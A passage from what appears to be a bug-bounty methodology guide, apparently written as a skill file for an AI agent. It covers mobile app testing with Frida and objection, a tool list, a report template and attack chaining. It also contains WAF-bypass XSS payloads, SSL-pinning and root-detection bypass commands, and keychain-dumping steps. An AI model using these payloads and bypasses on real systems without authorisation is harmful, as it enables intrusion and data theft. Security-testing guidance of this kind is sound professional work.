# Frida (runtime hooking)
frida -U -f com.target.app -l hook.js --no-pause
# Bypass root detection, SSL pinning, certificate checks
# objection (Frida wrapper)
objection -g com.target.app explore
→ android sslpinning disable
→ android root disable
```

### iOS
```bash
# IPA extraction (jailbroken)
ssh root@iphone 'find /var/containers -name "*.app"'
# Decrypt binary with frida-ios-dump or clutch

# Analysis
# Binary: class-dump, Hopper, Ghidra
# Plist files: plutil -p Info.plist
# Keychain: keychain-dumper

# Check for
- Hardcoded credentials/API keys
- Insecure data storage (NSUserDefaults, plist, SQLite)
- Weak transport security (ATS exceptions)
- URL schemes (CFBundleURLTypes in Info.plist)
- Universal links (apple-app-site-association)
```

---

## 🔧 TOOLS REFERENCE

### Web Proxies
- **Burp Suite** — Industry standard, extensions ecosystem
- **Caido** — Modern, fast Rust-based proxy
- **mitmproxy** — CLI proxy, scriptable with Python
- **httap** — HTTP intercepting proxy with MCP

### Scanners
- **nuclei** — Template-based vuln scanner (10K+ templates)
- **nikto** — Web server scanner
- **wpscan** — WordPress-specific
- **sqlmap** — SQL injection automation
- **dalfox** — XSS scanner
- **commix** — Command injection

### Recon
- **subfinder** — Subdomain enumeration
- **httpx** — HTTP probing + fingerprinting
- **katana** — Web crawler
- **gau** — URL harvester (AlienVault, Wayback, Common Crawl)
- **ffuf** — Fast fuzzer (dirs, params, vhosts)
- **feroxbuster** — Recursive content discovery
- **arjun** — HTTP parameter discovery
- **ParamSpider** — URL parameter mining

### Exploitation
- **ysoserial** — Java deserialization payloads
- **PHPGGC** — PHP deserialization payloads
- **jwt_tool** — JWT attack toolkit
- **GraphQLmap** — GraphQL exploitation
- **Turbo Intruder** — Race condition testing (Burp)

### Mobile
- **apktool** — Android APK decompiler
- **jadx** — Java decompiler for APK
- **frida** — Dynamic instrumentation
- **objection** — Runtime mobile exploration
- **MobSF** — Automated mobile security framework

---

## 📝 REPORTING — Writing P1 Reports

### Report Structure
```markdown
# Title: [Vuln Type] — [Impact] in [Feature/Endpoint]

## Summary
One paragraph: what, where, impact.

## Severity
CVSS score + justification. Be honest.

## Steps to Reproduce
1. Navigate to...
2. Intercept with proxy...
3. Modify parameter X to Y...
4. Observe that...

## Proof of Concept
- HTTP requests/responses
- Screenshots
- Video if complex
- Script if automated

## Impact
What can an attacker DO? Not what's theoretically possible.
- "Read any user's PII including SSN, email, phone"
- "Transfer funds from any account"
- "Execute arbitrary code on the server"

## Remediation
Specific fixes, not generic advice.
```

### CVSS Scoring Tips
- Don't inflate — triagers will downgrade and you lose credibility
- Network attack vector (AV:N) for web bugs
- Low complexity (AC:L) unless multi-step chain
- Consider scope change (S:C) for XSS (browser scope ≠ server scope)
- High confidentiality (C:H) only if truly sensitive data accessed

### Common Mistakes
- Reporting client-side analytics keys as "exposed secrets"
- Self-XSS without chain as a vulnerability
- Missing headers (X-Frame-Options, HSTS) without demonstrable impact
- CORS misconfiguration on endpoints with no sensitive data
- Open redirects without demonstrating phishing/token theft chain
- Information disclosure that reveals nothing useful

---

## 🧪 ADVANCED TECHNIQUES

### Chaining Bugs
```
# The money chain
Info disclosure (API key leak) → SSRF (internal service) → RCE

# The access chain
IDOR (read user data) → Account takeover (password reset with leaked info)

# The XSS chain
Reflected XSS → CSRF → Admin account creation → Full compromise

# The cloud chain
S3 listing → Source code → Hardcoded creds → AWS takeover

# The race chain
Race condition (double spend) → Business logic abuse → Financial loss
```

### WAF Bypass Techniques
```
# Encoding
URL encoding: %3Cscript%3E
Double encoding: %253Cscript%253E
Unicode: ＜script＞
HTML entities: &lt;script&gt;
Hex: \x3cscript\x3e

# Payload splitting
<scr<script>ipt>  # Server removes <script>, leaves <script> intact

# HTTP parameter pollution
?search=<script>&search=alert(1)&search=</script>

# Content-Type manipulation
Content-Type: text/plain (instead of application/json)
Content-Type: application/x-www-form-urlencoded (JSON in form encoding)
Multipart boundary manipulation

# Case variation and concatenation
<ScRiPt>
<SCRIPT>
<script/src=data:,alert(1)>

# Chunked Transfer Encoding
Vary chunk sizes to confuse WAF
```

### Wordlists
```
# SecLists — the essential collection
/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
/usr/share/seclists/Fuzzing/SQLi/
/usr/share/seclists/Fuzzing/XSS/
/usr/share/seclists/Passwords/
/usr/share/seclists/Usernames/

# Assetnote wordlists (larger, targeted)
https://wordlists.assetnote.io/

# Custom wordlists from target
cewl https://target.com -d 3 -m 5 -w custom_wordlist.txt
```

---

## 🎓 METHODOLOGY BY TARGET TYPE

### SPA (Single Page Application)
1. Intercept all API calls while using the app normally
2. Read all JS bundles → extract API endpoints, secrets, auth logic
3. Test every API endpoint for BOLA, broken auth, mass assignment
4. Check client-side routing for auth bypass
5. Test WebSocket connections if present

### REST API
1. Map all endpoints (documentation, JS analysis, fuzzing)
2. Test auth on every endpoint (token removal, expired tokens, other user tokens)
3. IDOR on every endpoint that takes an ID
4. Mass assignment on every POST/PUT/PATCH
5. Rate limiting on sensitive operations
6. Input validation on all parameters

### GraphQL
1. Introspection query (or field suggestion brute force)
2. Authorization testing on every field/mutation
3. Batch query abuse for rate limit bypass
4. Nested query DoS
5. SQL injection in arguments

### Mobile App Backend
1. Decompile app → extract all API endpoints + keys
2. Bypass certificate pinning → intercept traffic
3. Test all APIs as discovered above
4. Check for hardcoded secrets in binary
5. Test deep links / URL schemes for hijacking
6. Check local storage for sensitive data

### WordPress
1. wpscan --enumerate p,t,u (plugins, themes, users)
2. Check for known CVEs in detected plugin versions
3. Test wp-admin brute force (xmlrpc.php for amplification)
4. Check for path traversal in plugins
5. Test file upload functionality in plugins
6. Check REST API (/wp-json/) for auth bypass

---

## References
- Load `references/owasp-top10.md` for full OWASP Top 10 details
- Load `references/payloads.md` for copy-paste payload collections
- Load `references/checklist.md` for systematic testing checklists
- Load `references/cve-patterns.md` for common CVE patterns to look for
